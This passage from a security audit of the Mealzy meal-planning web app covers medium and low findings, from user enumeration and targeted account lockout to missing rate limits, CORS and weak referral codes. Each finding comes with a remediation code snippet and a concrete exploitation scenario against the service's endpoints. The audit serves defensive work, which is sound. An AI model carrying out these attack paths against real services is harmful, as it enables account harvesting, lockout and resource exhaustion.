  "base-uri 'self'; " +            // added
  "form-action 'self'; " +         // added
  "frame-ancestors 'none';"        // added — supersedes X-Frame-Options
);
```

Fonts are self-hosted per the project's own brand rules, so `fonts.googleapis.com`/`fonts.gstatic.com` and `cdn.jsdelivr.net` can be dropped from the allowlist — verify first with:

```bash
grep -rn "jsdelivr\|fonts.googleapis" public/*.html dist/*.html
```

Second, to remove `'unsafe-inline'`: move inline handlers to `addEventListener` in the page's script block, then adopt a per-response nonce:

```js
app.use((req, res, next) => {
  res.locals.nonce = require('crypto').randomBytes(16).toString('base64');
  next();
});
// script-src 'self' 'nonce-${res.locals.nonce}' https://js.stripe.com ...
```

Consider `helmet` to manage these headers — it is not currently a dependency, and it would also drop the deprecated no-op `X-XSS-Protection` header set at line 100.

---

## M-04 — User enumeration across multiple endpoints

**Locations:** [server.js:604](server.js#L604), [server.js:661](server.js#L661), [server.js:648](server.js#L648), [server.js:2309](server.js#L2309)

```js
if (existing) return res.status(409).json({ error: 'account_exists', ... });                  // signup
if (!/^\$2[aby]\$/.test(storedHash)) return res.status(403).json({ error: 'password_reset_required' });  // signin
if (!user) { recordFailedLogin(email); return res.status(401).json({ error: 'invalid_credentials' }); }  // signin
```

**Vulnerability & impact.** Four separate oracles disclose whether a given email has an account:

1. **Signup** returns `409 account_exists` — a definitive answer, unauthenticated, at 10 req/min/IP.
2. **Signin** returns `403 password_reset_required` for legacy pre-bcrypt accounts versus `401` otherwise — distinguishes a real account from a nonexistent one.
3. **Signin timing.** When `user` is falsy the handler returns immediately; when the user exists it runs `bcrypt.compare` at cost 12 (~250 ms). That difference is trivially measurable and reliable.
4. **`/api/ref-lookup`** ([server.js:2309](server.js#L2309)) is unauthenticated, has no rate limiter, and returns `{found: true, email: user.email}` for a valid referral code — direct email disclosure rather than mere existence.

The reset-request handler at line 726 is correctly written to avoid this, which makes the inconsistency clearer.

**Severity: Medium.** Enumerated account lists enable credential-stuffing, targeted phishing, and — combined with M-05 — targeted account lockout. Under GDPR an email address is personal data, so unauthenticated disclosure is also a compliance exposure.

**Exploitation scenario.** An attacker takes a breach corpus and POSTs each address to `/api/auth/signup`. `409` confirms a Mealzy account. They now have a validated target list for credential stuffing against `/api/auth/signin`, and for phishing that credibly references the real service. Separately, they enumerate `/api/ref-lookup?code=ref_XXXXXX` — six uppercase alphanumerics, and the codes are generated with `Math.random()` (L-01), not a CSPRNG — to harvest addresses directly, with no rate limit to slow them.

**Remediation.** Signup enumeration cannot be fully closed without an email-verification flow, which is the proper fix: always return success, and disclose account existence only in the email itself.

```js
// server.js — /api/auth/signup
const existing = await db.getUserByEmail(email);
if (existing) {
  await sendEmail(email, 'Someone tried to sign up with your email',
                  emailAccountExists(existing.name)).catch(() => {});
  return res.json({ success: true, message: 'Check your email to continue.' });   // same shape as success
}
```

Equalise the signin paths — always run a bcrypt comparison, and collapse the legacy branch into the generic failure:

```js
const DUMMY_HASH = '$2a$12$' + 'x'.repeat(53);          // module-level constant
const storedHash = user?.hashed_password || '';
const usable     = /^\$2[aby]\$/.test(storedHash);
const valid      = await bcrypt.compare(password, usable ? storedHash : DUMMY_HASH);
if (!user || !usable || !valid) {
  if (user) recordFailedLogin(email);
  return res.status(401).json({ error: 'invalid_credentials', message: 'Email or password is incorrect.' });
}
```

Require a session on `/api/ref-lookup` and never return the referrer's email — resolve the code to an opaque id server-side and keep the mapping internal. At minimum apply `authLimiter` to it.

---

## M-05 — Targeted account lockout denial of service

**Location:** [server.js:349](server.js#L349), [server.js:362](server.js#L362)

```js
const failedLoginAttempts = new Map();   // email -> { count, lastAttempt, lockedUntil }
const MAX_FAILED_ATTEMPTS = 10;
const LOCKOUT_DURATION_MS = 15 * 60 * 1000;
```

**Vulnerability & impact.** Lockout is keyed on the **email address supplied by the attacker**, not on the source IP. Ten failed attempts against any address lock that account for 15 minutes, regardless of who submitted them or from where. Critically, `recordFailedLogin(email)` is called at line 649 even when **no such user exists**, so the map also accumulates entries for arbitrary addresses (see M-06).

This is the classic trade-off in per-account lockout: it defends against password guessing but hands the attacker a targeted availability weapon against any account whose email they know — and M-04 gives them the list.

**Severity: Medium.** Sustained, targeted denial of service against arbitrary named users, at negligible attacker cost.

**Exploitation scenario.** The attacker enumerates accounts via M-04, then loops 10 bad passwords per address. `authLimiter` allows 10 requests/min/IP, which is exactly enough to lock one account per minute per IP; the lockout lasts 15 minutes, so ~15 accounts stay permanently locked from a single IP, or the entire user base from a small proxy pool. Victims see "Email or password is incorrect" and conclude their account was hacked. Notably, `/auth/google` is unaffected, so users with Google sign-in have a route in — but password users do not.

**Remediation.** Key the counter on the (email, IP) pair so one attacker cannot lock a victim globally, and stop recording failures for addresses that do not exist:

```js
function failKey(email, req) { return `${email}|${clientIp(req)}`; }

// only after confirming the account exists
if (user && !valid) recordFailedLogin(failKey(email, req));
```

Add progressive delay rather than a hard lock, so a legitimate user is slowed rather than shut out:

```js
const record = failedLoginAttempts.get(failKey(email, req));
if (record?.count > 3) {
  await new Promise(r => setTimeout(r, Math.min(2 ** (record.count - 3) * 100, 5000)));
}
```

Keep the hard lockout only as a backstop at a much higher threshold (say 50 attempts from one IP), and email the account owner when it triggers so a real attack is visible.

---

## M-06 — Unbounded in-memory Maps keyed on attacker-controlled values

**Locations:** [server.js:344](server.js#L344), [server.js:346](server.js#L346), [server.js:349](server.js#L349), [server.js:385](server.js#L385)

```js
const usageTracker      = new Map();   // ip -> { count, month }
const referralBonus     = new Map();   // email -> count
const failedLoginAttempts = new Map(); // email -> { count, lastAttempt, lockedUntil }

function incrementUsage(ip) { const usage = getUsage(ip); usage.count += 1; usageTracker.set(ip, usage); return usage; }
```

**Vulnerability & impact.** Three process-lifetime Maps grow without bound, and all three are keyed on values an unauthenticated caller chooses:

- `usageTracker` — keyed on the spoofable `X-Forwarded-For` value (H-05). One new entry per distinct spoofed IP, forever. Entries are only replaced when the month rolls over, never deleted.
- `failedLoginAttempts` — keyed on any submitted email, including nonexistent ones. `clearFailedLogins` runs only on successful login, and the expiry path at line 358 only deletes entries that reached the *locked* state. An entry with `count < 10` is never removed.
- `referralBonus` — keyed on any email passed to `/api/referral-status`, which is unauthenticated and unrate-limited.

Render's free tier has a small memory allocation. There is also no `unhandledRejection`/OOM recovery that preserves state — and the `uncaughtException` handler at line 2453 deliberately does *not* exit, so the process may continue in a degraded state rather than restarting cleanly.

**Severity: Medium.** Cheap, unauthenticated, remotely-triggered memory exhaustion. Amplified by H-05, which requires spoofing for its own purposes anyway.

**Exploitation scenario.** The H-05 quota-bypass loop is simultaneously a memory attack: each spoofed `X-Forwarded-For` adds a permanent `usageTracker` entry. A parallel loop posting distinct random emails to `/api/auth/signin` grows `failedLoginAttempts` at 10 entries/min/IP with no cleanup. Together, a few hundred thousand entries exhausts the free-tier heap, the process is OOM-killed, and every user hits a 30–60 second cold start on the next request. Because `usageTracker` is in-memory, the restart also resets all anonymous quotas — so the DoS and the paywall bypass reinforce each other.

**Remediation.** Move this state to the database, which is where it belongs — the codebase already does exactly this for coach usage (`db.getCoachUsage`/`db.incrementCoachUsage`, `coach_usage` table) and for referral bonuses (`users.bonus_plans`). The in-memory copies are legacy duplicates; the comment at line 346 says as much ("SQLite is source of truth").

Requiring authentication on `/api/generate-meal` (H-06) eliminates `usageTracker` entirely, since the quota then keys on `userId` and can be counted from the `analytics` table exactly as the logged-in branch at line 1528 already does.

For anything that must stay in memory, bound it and sweep it:

```js
const MAX_ENTRIES = 10_000;
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const [k, v] of failedLoginAttempts) {
    if ((v.lastAttempt || 0) < cutoff) failedLoginAttempts.delete(k);
  }
  if (failedLoginAttempts.size > MAX_ENTRIES) failedLoginAttempts.clear();
}, 10 * 60 * 1000).unref();
```

Also reconsider the `uncaughtException` handler: continuing after an unknown exception leaves the process in an undefined state. Log, then exit and let Render restart it.

---

## M-07 — No session revocation; sessions extend indefinitely

**Locations:** [server.js:712](server.js#L712), [server.js:705](server.js#L705), [server.js:771](server.js#L771)

```js
app.post('/api/auth/signout', async (req, res) => { clearJwtCookie(res); res.json({ success: true }); });
// /api/auth/me — every call:
setJwtCookie(res, { userId: user.id, email: user.email, pro: serverPro });
// /api/auth/reset-confirm — password changed, but no session invalidation
await db.updatePassword(record.user_id, finalHash);
```

**Vulnerability & impact.** Sessions are stateless JWTs with no server-side registry, so there is no way to invalidate one. Three consequences:

1. **Signout is cosmetic.** It clears the browser's cookie; the token remains cryptographically valid for its full 24 hours. Anyone holding a copy keeps access.
2. **Password reset does not revoke sessions.** After a compromise, the victim changes their password — the standard remedy — and the attacker's existing token keeps working for up to 24 more hours. This defeats the primary purpose of a password reset.
3. **Indefinite extension.** `/api/auth/me` re-issues a fresh 24-hour token on every call, and the dashboard calls it on load. A session that is polled regularly never expires, so `JWT_EXPIRES = '24h'` provides no real bound for active users.

**Severity: Medium.** Removes the primary tool for containing a session compromise, at exactly the moment it is needed.

**Exploitation scenario.** An attacker obtains a session token — via the XSS in M-01, a shared device, or a stolen laptop. The victim notices, changes their password, and signs out everywhere. Neither action affects the attacker: `/api/auth/reset-confirm` only writes a new hash, and signout only touched the victim's own browser. The attacker keeps reading `/api/profile` (weight, height, age, allergies) and can keep the session alive indefinitely by polling `/api/auth/me`.

**Remediation.** Add a token version column and include it in the JWT, then bump it to revoke every outstanding session for that user. This is a small change that gives real revocation without a session store.

```sql
ALTER TABLE users ADD COLUMN token_version INTEGER DEFAULT 0;
```

```js
// include it when signing
setJwtCookie(res, { userId: user.id, email: user.email, pro: serverPro, tv: user.token_version || 0 });

// verify it on every authenticated request
async function requireSession(req, res, next) {
  const s = getSessionFromReq(req);
  if (!s) return res.status(401).json({ error: 'not_authenticated' });
  const user = await db.getUserById(s.userId);
  if (!user || (user.token_version || 0) !== (s.tv || 0)) {
    clearJwtCookie(res);
    return res.status(401).json({ error: 'session_revoked' });
  }
  req.user = user;
  next();
}
```

Bump the version on password reset (and offer it as an explicit "sign out everywhere" action):

```js
await db.updatePassword(record.user_id, finalHash);
await db.run('UPDATE users SET token_version = COALESCE(token_version, 0) + 1 WHERE id = ?', [record.user_id]);
```

Bound total session lifetime by carrying the original issue time and refusing to extend past it:

```js
const MAX_SESSION_MS = 7 * 24 * 60 * 60 * 1000;
if (Date.now() - (session.iat * 1000) < MAX_SESSION_MS) setJwtCookie(res, {...});   // else require re-login
```

Introducing `requireSession` also fixes a structural weakness: session checks are currently duplicated inline in ~25 handlers, and a single omission silently creates an unauthenticated endpoint.

---

## M-08 — 10 MB request body accepted on every route

**Location:** [server.js:142](server.js#L142)

```js
app.use(express.json({ limit: '10mb' }));
```

**Vulnerability & impact.** A 10 MB JSON ceiling applies globally, including to every unauthenticated endpoint. Only `/api/recipes/import-photo` plausibly needs a large body (base64 image). Elsewhere the ceiling is pure attack surface: each in-flight request can pin 10 MB plus JSON-parse overhead, and deeply nested JSON costs CPU in `JSON.parse` before any handler validation runs. On Render's free tier a handful of concurrent large bodies is enough to exhaust memory.

It also amplifies H-06: the 10 MB limit is what allows megabytes of text to reach the Anthropic prompt.

**Severity: Medium.** Trivially triggered resource exhaustion; a force multiplier for the cost-abuse findings.

**Exploitation scenario.** An attacker sends concurrent 10 MB POSTs to `/api/track` (unauthenticated, 30/min/IP). The payload-size check at line 1338 runs only *after* `express.json()` has already parsed the full body, so the guard does not prevent the resource consumption. Twenty concurrent requests reserve ~200 MB and the instance is OOM-killed.

**Remediation.** Set a small global default and raise it only where genuinely required:

```js
app.use(express.json({ limit: '64kb' }));                    // covers every normal endpoint
```

```js
// routes/recipes.js — the one route that needs headroom
app.post('/api/recipes/import-photo',
  express.json({ limit: '8mb' }),
  generateLimiter,
  async (req, res) => { /* ... */ });
```

Also cap the base64 payload explicitly, since 8 MB of base64 still exceeds Anthropic's per-image limit and will fail after the cost of transfer:

```js
if (imageData.length > 5 * 1024 * 1024) {
  return res.status(413).json({ error: 'image_too_large', message: 'Image must be under 3.75 MB.' });
}
if (!/^[A-Za-z0-9+/]+={0,2}$/.test(imageData)) {
  return res.status(400).json({ error: 'invalid_base64' });
}
```

---

## M-09 — Rate limiting absent on most endpoints

**Locations:** `/api/profile` (871, 886, 895), `/api/plans/save` (1052), `/api/plans` (1068), `/api/plans/share` (2271), `/api/shared-plan/:shareId` (2293), `/api/ref-lookup` (2309), `/api/referral-status` (1458), `/api/referral-capture` (1446), `/api/xp/award` (2178), `/api/share-card/:userId` (2247), `/api/nps/check` (1168), `/api/nps/submit` (1186), `/api/cancel-subscription` (1123), `/api/auth/me` (693), `/api/admin/*` (1290, 1312), `/api/analytics` (1346), `/api/family-profiles` (907, 916, 953), `/api/recipes/save`, `/api/recipes`, `/api/recipes/:id`

**Vulnerability & impact.** Six limiters are defined (`authLimiter`, `generateLimiter`, `demoLimiter`, `aiLimiter`, `trackLimiter`, `leadLimiter`) and applied to nine routes. Roughly twenty remaining endpoints — including all of the admin routes, several unauthenticated ones, and every database-write route — have no limiter at all. Each unlimited write is an amplification primitive: `/api/plans/save` and `/api/plans/share` insert unbounded rows into Turso; `/api/xp/award` writes a profile row per call; `/api/admin/grant-pro` can be brute-forced for its token without throttling.

`express-rate-limit` also uses the default in-memory store, so counters are per-instance and reset on every restart — frequent on Render's free tier.

**Severity: Medium.** Enables resource exhaustion, unbounded database growth (Turso free-tier row/storage limits), and unthrottled credential brute-forcing against `/api/admin/*`.

**Exploitation scenario.** An authenticated attacker loops `POST /api/plans/share`, inserting a row per request with no cap. Turso storage fills, `/api/plans/save` begins failing for real users, and — since each share row holds an arbitrary caller-supplied `plan` blob (M-01) — a modest script writes gigabytes. Separately, `POST /api/admin/grant-pro` can be hammered with candidate `x-admin-token` values at full network speed, with each failure logged but never throttled.

**Remediation.** Apply a default limiter to the whole API surface, then keep the specific tighter limiters where they already exist:

```js
const apiLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 60,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please slow down.' }
});
app.use('/api/', apiLimiter);       // place immediately after express.json()
```

Add a strict limiter to the admin routes:

```js
const adminLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 20 });
app.post('/api/admin/grant-pro', adminLimiter, requireAdmin, ...);
app.get('/api/admin/export',     adminLimiter, requireAdmin, ...);
```

Note the Stripe webhook must stay exempt — it is registered before `express.json()` and Stripe's retries should not be throttled.

Because counters reset on restart, consider a Turso-backed store for the limits that protect money (`generateLimiter`, `aiLimiter`) so a cold start does not reset the ceiling.

---

## M-10 — PII in logs and analytics with no retention limit or erasure path

**Locations:** [server.js:1156](server.js#L1156), [server.js:1203](server.js#L1203), [server.js:1201](server.js#L1201), [server.js:1155](server.js#L1155), [server.js:369](server.js#L369), [server.js:660](server.js#L660), [server.js:895](server.js#L895)

```js
logger.info(`[cancel] ${user.email} — reason: ${reason}`);
logger.info(`[nps] ${user.email} — score: ${score}`);
await db.logEvent('nps_response',  { email: user.email, score, comment }, '');
await db.logEvent('cancel_survey', { email: user.email, reason, detail }, '');
logger.warn('[auth] Account lockout triggered', { email, attempts: record.count });
```

**Vulnerability & impact.** Email addresses are written to application logs and to the `analytics` table in cleartext, alongside free-text NPS comments and cancellation reasons. The `analytics` table has no retention policy, no pruning job, and no per-user index — `getAnalytics()` simply reads the most recent 5,000 rows.

`DELETE /api/profile` ([server.js:895](server.js#L895)) deletes only the `profiles` row. Data left behind for that user: `users`, `plans`, `analytics` (including their email in event payloads), `leads`, `referrals`, `grocery_lists`, `recipes`, `share_links`, `coach_usage`. **There is no account-deletion endpoint at all.**

The product also stores health-adjacent data — weight, height, age, allergies, dietary restrictions — which under GDPR Art. 9 is closer to special-category data than ordinary profile data.

**Severity: Medium.** A GDPR compliance gap (Art. 17 right to erasure, Art. 5(1)(e) storage limitation) for an EU-operated service, and it broadens the blast radius of any log or database disclosure. Rated Medium rather than High because it needs a separate breach to become an incident, but the regulatory exposure is independent of that.

**Exploitation scenario.** Two paths. **Technical:** an attacker with Render log access (see H-02, which puts admin tokens in the same stream) harvests a mapping of email addresses to cancellation reasons and NPS comments — free-text fields where users write candid personal detail. **Regulatory:** a user exercises their Art. 17 right. There is no mechanism to comply: their email persists in `analytics` payloads indefinitely, their plans and grocery lists remain, and `DELETE /api/profile` cannot reach any of it.

**Remediation.** Stop writing emails to logs and analytics — reference the opaque `userId`, which is already available everywhere:

```js
logger.info('[cancel] subscription cancelled', { userId: user.id, reason });
logger.info('[nps] response recorded',         { userId: user.id, score });
await db.logEvent('nps_response',  { userId: user.id, score, comment }, '');
await db.logEvent('cancel_survey', { userId: user.id, reason, detail }, '');
logger.warn('[auth] Account lockout triggered', { userId: user?.id, attempts: record.count });
```

Add a real deletion endpoint covering every table:

```js
// server.js
app.delete('/api/account', authLimiter, async (req, res) => {
  const session = getSessionFromReq(req);
  if (!session) return res.status(401).json({ error: 'not_authenticated' });
  const uid = session.userId;
  const user = await db.getUserById(uid);
  if (!user) return res.status(404).json({ error: 'user_not_found' });

  for (const sql of [
    'DELETE FROM profiles        WHERE user_id = ?',
    'DELETE FROM plans           WHERE user_id = ?',
    'DELETE FROM grocery_lists   WHERE user_id = ?',
    'DELETE FROM recipes         WHERE user_id = ?',
    'DELETE FROM family_profiles WHERE user_id = ?',
    'DELETE FROM share_links     WHERE user_id = ?',
    'DELETE FROM coach_usage     WHERE user_id = ?',
    'DELETE FROM reset_tokens    WHERE user_id = ?',
  ]) await db.run(sql, [uid]);

  await db.run('DELETE FROM leads     WHERE email = ?',          [user.email]);
  await db.run('DELETE FROM referrals WHERE referrer_email = ? OR referred_email = ?', [user.email, user.email]);
  await db.run('DELETE FROM users     WHERE id = ?',             [uid]);

  clearJwtCookie(res);
  res.json({ success: true });
});
```

Add a retention sweep to the existing cron surface — the `purgeExpiredTokens()` pattern at line 720 is the model:

```js
// db.js
async function purgeOldAnalytics() {
  await run(`DELETE FROM analytics WHERE created_at < datetime('now', '-90 days')`);
}
```

Since the user is 16 and operating in Sweden, note that an active Stripe subscription must be cancelled before deletion, and invoice records must be retained for Swedish bookkeeping law (*bokföringslagen*, 7 years) — retain those in Stripe, not in Mealzy's own tables.

---

## M-11 — Non-constant-time comparison of admin and cron secrets

**Locations:** [server.js:119](server.js#L119), [server.js:2354](server.js#L2354)

```js
if (!token || token !== process.env.ADMIN_TOKEN) { /* 401 */ }        // requireAdmin
if (!secret || secret !== process.env.CRON_SECRET) { /* 401 */ }      // cronAuth
```

**Vulnerability & impact.** JavaScript's `!==` on strings short-circuits at the first differing byte, so comparison time correlates with the length of the matching prefix. A `timingSafeCompare` helper already exists at [server.js:307](server.js#L307) and is correctly used for `PRO_TOKEN` at lines 1352 and 2333 — these two sites simply were not updated.

Both checks do guard against the H-01 fail-open pattern via their leading `!token` / `!secret` test, so an unset env var does not grant access here. The residual issue is the timing side channel.

**Severity: Medium.** Byte-at-a-time secret recovery is difficult but not theoretical over a network; the fix is one line each and the helper is already written.

**Exploitation scenario.** An attacker sends many requests to `/api/admin/export` with candidate first bytes, measuring response latency to identify which prefix takes marginally longer. Network jitter means thousands of samples per byte are needed — but there is no rate limiter on the admin routes (M-09), so sampling is unconstrained. Recovering the token yields the full user export.

**Remediation.** Use the existing helper and require a configured minimum length so the check cannot degenerate:

```js
function requireAdmin(req, res, next) {
  const token  = req.headers['x-admin-token'];
  const expect = process.env.ADMIN_TOKEN || '';
  if (expect.length < 32 || typeof token !== 'string' || !timingSafeCompare(token, expect)) {
    logger.warn('[admin] Unauthorized attempt', { ip: req.ip, path: req.path });
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}
```

Apply the same shape in `cronAuth` (full version in H-07). Note that `timingSafeCompare` returns `false` on length mismatch, which leaks token *length* — acceptable here, since lengths are fixed by generation.

---

## M-12 — Vulnerable dependencies

**Source:** `npm audit` — 3 advisories (2 high, 1 low)

| Package | Installed | Advisory | Severity | Path |
|---|---|---|---|---|
| `sharp` | 0.34.5 | [GHSA-f88m-g3jw-g9cj](https://github.com/advisories/GHSA-f88m-g3jw-g9cj) — libvips CVE-2026-33327/33328/35590/35591 | High | direct (devDependency) |
| `brace-expansion` | ≤5.0.7 | [GHSA-3jxr-9vmj-r5cp](https://github.com/advisories/GHSA-3jxr-9vmj-r5cp), [GHSA-mh99-v99m-4gvg](https://github.com/advisories/GHSA-mh99-v99m-4gvg) — DoS / OOM via unbounded expansion | High | transitive |
| `body-parser` | 1.20.5 | [GHSA-v422-hmwv-36x6](https://github.com/advisories/GHSA-v422-hmwv-36x6) — invalid `limit` silently disables size enforcement | Low | transitive (via express 4.22.2) |

**Vulnerability & impact.** `sharp` is a devDependency used only by the build (`scripts/prerender.mjs` context), and `render.yaml` installs devDependencies (`npm install --include=dev`) — so the vulnerable libvips is present in the build environment. The CVEs concern malformed image parsing; exposure depends on whether the build processes untrusted images. Reviewing the repo, image inputs are the project's own committed assets, so practical risk is low — but the package is in the production install tree.

`body-parser` is the more directly relevant one: the advisory describes an invalid `limit` value silently disabling size enforcement. Combined with M-08's 10 MB limit, it is worth patching so the ceiling is reliably applied.

`brace-expansion` is a build-time glob dependency; DoS requires attacker-controlled glob patterns, which do not occur here.

**Severity: Medium** in aggregate. No advisory is directly remotely exploitable in this application's configuration, but two are rated High upstream and all three have fixes available.

**Exploitation scenario.** The realistic path is supply-chain rather than direct: `sharp`'s native libvips runs during the Render build with access to the build environment, which holds every `sync: false` secret from `render.yaml`. If a future change routes user-supplied images through `sharp` — a plausible extension of the existing recipe-photo feature — the libvips CVEs become directly reachable with attacker-controlled input.

**Remediation.** Patch the transitive advisories first — non-breaking:

```bash
npm audit fix
```

Then update `sharp` deliberately, since it is a major bump:

```bash
npm install --save-dev sharp@^0.35.3
npm run build
```

Verify the build still produces `dist/` correctly before deploying — a failed build silently activates the M-01 XSS path.

Confirm the result and keep it current:

```bash
npm audit --omit=dev     # production tree specifically
```

Enable Dependabot alerts and security updates on the repository; with a single maintainer, automated PRs are the only realistic way this stays patched.

---

## M-13 — `deleteGroceryListForPlanDay` is not scoped to the owning user

**Location:** [db.js:566](db.js#L566), called from [server.js:2008](server.js#L2008)

```js
// db.js
await run('DELETE FROM grocery_lists WHERE plan_id = ? AND day = ?', [planId, day]);
```

**Vulnerability & impact.** This is the only data-access function in `db.js` that mutates user-owned rows without a `user_id` predicate. Compare its siblings, which all scope correctly: `deleteFamilyProfile` (line 338), the recipe delete in `routes/recipes.js:107`, and every `getRecipes`/`getGroceryListsForPlan` read.

The calling handler does compensate. At [server.js:2001](server.js#L2001) it checks ownership before reusing a caller-supplied `planId`:

```js
if (planId) {
  const existingRows = await db.getGroceryListsForPlan(planId);
  if (existingRows.length > 0 && existingRows[0].userId !== session.userId) planId = null;
}
```

So the vulnerability is not currently reachable — a spoofed `planId` belonging to another user is replaced with a fresh UUID before the delete runs. This is a defence-in-depth gap rather than a live flaw: the authorisation decision lives entirely in the route, and any second caller of `deleteGroceryListForPlanDay` that forgets the check becomes an immediate cross-tenant delete primitive.

Note the ownership check itself inspects only `existingRows[0]` — correct today because all rows for a `plan_id` share one owner, but it is an assumption not enforced by a constraint.

**Severity: Medium.** Not exploitable as written; a one-line omission away from cross-tenant data destruction.

**Exploitation scenario.** If a future refactor calls `deleteGroceryListForPlanDay` from a new endpoint — a bulk "clear my week" action, say — without replicating the line-2001 check, then `POST` with another user's `planId` deletes their grocery list for that day. The victim's data is gone with no audit trail, since the delete is not logged.

**Remediation.** Enforce the constraint in the data layer, so correctness does not depend on every caller remembering:

```js
// db.js
async function deleteGroceryListForPlanDay(planId, day, userId) {
  await run(
    'DELETE FROM grocery_lists WHERE plan_id = ? AND day = ? AND user_id = ?',
    [planId, day, userId]
  );
}
```

```js
// server.js:2008
await db.deleteGroceryListForPlanDay(planId, day, session.userId);
```

Audit the rest of the data layer for the same pattern:

```bash
grep -nE "DELETE FROM|UPDATE " db.js | grep -v "user_id"
```

Adding a composite index also helps correctness and performance:

```sql
CREATE INDEX IF NOT EXISTS idx_grocery_user_plan_day ON grocery_lists(user_id, plan_id, day);
```

---

## M-14 — `http://localhost:3000` allowed as a production CORS origin

**Location:** [server.js:135](server.js#L135)

```js
app.use(cors({
  origin: ['https://mealzy.org', 'http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'x-admin-token', 'x-pro-token', 'x-cron-secret']
}));
```

**Vulnerability & impact.** The allowlist is correctly explicit (no wildcard, no origin reflection) and `credentials: true` is paired with specific origins rather than `*` — the common critical mistake is avoided. The issue is that the development origin is present unconditionally in production, and it is paired with `credentials: true`, so a page served from `http://localhost:3000` can make authenticated cross-origin requests to the live API and read the responses.

The `SameSite=Lax` cookie limits this substantially: Lax withholds the cookie on cross-site subresource requests including `fetch`, so a `localhost` page cannot silently ride the victim's live session. That is why this is Medium and not High. The exposure that remains is real but narrow: any developer or attacker who can get a listener on the victim's port 3000 has a permitted origin against production, and the header allowlist explicitly includes `x-admin-token`, `x-pro-token`, and `x-cron-secret`.

**Severity: Medium.** Largely mitigated by `SameSite=Lax`, but an unnecessary standing exception that also whitelists admin headers.

**Exploitation scenario.** A developer runs an untrusted project on port 3000 — a plausible default for Node tooling. That project's page is an allowed origin against `https://mealzy.org` and can issue `fetch` with `credentials: 'include'` plus arbitrary `x-admin-token` guesses, reading full responses. Any locally-installed malware that binds port 3000 gains the same standing permission, with no CORS preflight failure to signal it.

**Remediation.** Make the allowlist environment-dependent so `localhost` exists only in development:

```js
const ALLOWED_ORIGINS = process.env.NODE_ENV === 'production'
  ? ['https://mealzy.org', 'https://www.mealzy.org']
  : ['https://mealzy.org', 'http://localhost:3000'];

app.use(cors({
  origin: ALLOWED_ORIGINS,
  credentials: true,
  methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'x-admin-token', 'x-pro-token', 'x-cron-secret'],
  maxAge: 600
}));
```

Admin headers should not be reachable cross-origin at all. Once M-03/H-03 move admin auth onto an authenticated session allowlist, drop `x-admin-token`, `x-pro-token`, and `x-cron-secret` from `allowedHeaders` entirely — cron and admin calls are server-to-server and never need CORS.

---

## M-15 — Cron endpoints leak internal error messages

**Locations:** [server.js:2385](server.js#L2385), [server.js:2408](server.js#L2408)

```js
} catch(err) {
  console.error('[cron/day3-nudge] error:', err);
  res.status(500).json({ error: err.message });      // raw internal message to the caller
}
```

**Vulnerability & impact.** Both cron handlers return `err.message` verbatim. Everywhere else in the codebase the pattern is a generic `'Something went wrong. Please try again.'`, so this is an inconsistency rather than a design choice. Raw error text from `@libsql/client` or the Resend `fetch` can disclose database hostnames, table and column names, constraint names, driver versions, and upstream API error detail — useful reconnaissance for building a more precise attack.

Access requires `CRON_SECRET`, which limits reach — but H-07 establishes that this secret is stored in a non-masked namespace and should be treated as potentially exposed.

**Severity: Medium.** Information disclosure to an authenticated-but-not-trusted caller, gated behind a credential with its own weakness.

**Exploitation scenario.** An attacker who recovers `CRON_SECRET` (H-07) calls `/api/cron/day3-nudge` repeatedly. Induced failures return messages such as `SQLITE_ERROR: no such column: users.nudge_sent` or Turso connection strings, mapping the schema and infrastructure without any other access. That intelligence then guides targeting of the endpoints that do handle user data.

**Remediation.** Match the pattern used by the rest of the file — log the detail, return nothing:

```js
} catch(err) {
  logger.error('[cron/day3-nudge] error', { message: err.message, stack: err.stack });
  res.status(500).json({ error: 'cron_failed' });
}
```

Apply the same to `/api/cron/weekly-digest` at line 2408. The global error handler at [server.js:2444](server.js#L2444) already does this correctly and can serve as the reference. Verify no other route returns raw error text:

```bash
grep -n "err\.message\|error\.message" server.js db.js routes/*.js | grep -v "logger\|console"
```

---

# LOW

## L-01 — Referral codes generated with `Math.random()`
**Locations:** [server.js:612](server.js#L612), [server.js:847](server.js#L847)
```js
const refCode = 'ref_' + Math.random().toString(36).slice(2, 8).toUpperCase();
```
`Math.random()` is not a CSPRNG — V8's xorshift128+ state is recoverable from a few observed outputs, making subsequent codes predictable. Only 6 base-36 characters of entropy (~31 bits before uppercasing collapses the alphabet further). Combined with the unauthenticated, unrate-limited `/api/ref-lookup` (M-04), codes can be enumerated to harvest email addresses.
**Fix:**
```js
const refCode = 'ref_' + require('crypto').randomBytes(6).toString('base64url').toUpperCase();
```

## L-02 — Share IDs are 40 bits with no rate limit
**Locations:** [server.js:2278](server.js#L2278), [server.js:2293](server.js#L2293)
```js
const shareId = require('crypto').randomBytes(5).toString('hex'); // comment says "8 chars" — actually 10
```
Cryptographically random (good) but only 40 bits, and `GET /api/shared-plan/:shareId` is unauthenticated with no limiter, so shared plans are brute-forceable at scale. Shared plans embed meal and cost data. Also fix the misleading comment.
**Fix:** `randomBytes(16).toString('base64url')`, and apply `apiLimiter` from M-09.

## L-03 — `clearJwtCookie` and `oauth_state` omit the `Secure` flag
**Locations:** [server.js:262](server.js#L262), [server.js:795](server.js#L795)
```js
res.setHeader('Set-Cookie', 'mealzy_session=; HttpOnly; SameSite=Lax; Max-Age=0; Path=/');
res.setHeader('Set-Cookie', `oauth_state=${state}; HttpOnly; SameSite=Lax; Max-Age=300; Path=/`);
```
`setJwtCookie` correctly conditions `Secure` on `NODE_ENV`; these two do not. HSTS at line 101 mitigates in practice. Note `oauth_state` is also never cleared after the callback consumes it.
**Fix:** add the same `secure` suffix used at line 253, and expire `oauth_state` in the callback.

## L-04 — JWT algorithm not pinned on verify
**Location:** [server.js:275](server.js#L275)
```js
return jwt.verify(token, JWT_SECRET);
```
`jsonwebtoken` 9.x already rejects `alg: none` and restricts algorithms by key type, so this is not exploitable — but pinning is free and guards against future library or key-type changes.
**Fix:** `jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })`

